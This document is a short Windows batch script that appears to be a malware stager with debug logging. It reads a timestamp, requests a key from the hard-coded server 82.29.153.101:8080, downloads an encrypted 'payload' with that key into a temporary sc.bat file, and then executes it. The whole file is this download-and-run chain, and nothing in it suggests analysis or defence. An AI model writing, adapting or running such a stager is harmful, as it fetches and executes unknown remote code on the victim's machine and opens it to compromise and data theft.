@echo off
setlocal

echo [INFO] ===== START =====
echo [INFO] BASE=http://82.29.153.101:8080
echo [INFO] FILE=%temp%\sc.bat

set BASE=http://82.29.153.101:8080
set FILE=%temp%\sc.bat
set KEYFILE=%temp%\key.txt

REM ===== TS =====
echo [INFO] Generating timestamp...
for /f %%i in ('powershell -NoP -Command "[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds()"') do set TS=%%i
echo [DEBUG] TS=%TS%

REM ===== KEY =====
echo [INFO] Requesting KEY...
curl -s "%BASE%/auth/key?ts=%TS%" > "%KEYFILE%"

if not exist "%KEYFILE%" (
    echo [ERROR] Key file not created
    exit /b 1
)

set /p KEY=<"%KEYFILE%"
echo [DEBUG] KEY=%KEY%

if "%KEY%"=="" (
    echo [ERROR] KEY is empty
    exit /b 1
)

REM ===== PAYLOAD =====
echo [INFO] Downloading payload...
curl -s -H "X-Decrypt-Key: %KEY%" "%BASE%/payload/encrypted" -o "%FILE%"
echo [DEBUG] curl exit code=%errorlevel%

if exist "%FILE%" (
    echo [DEBUG] Payload file exists
) else (
    echo [ERROR] Payload file NOT found
    exit /b 1
)

REM ===== EXEC =====
echo [INFO] Executing %FILE%
call "%FILE%"
echo [DEBUG] Execution exit code=%errorlevel%

echo [INFO] ===== END =====

endlocal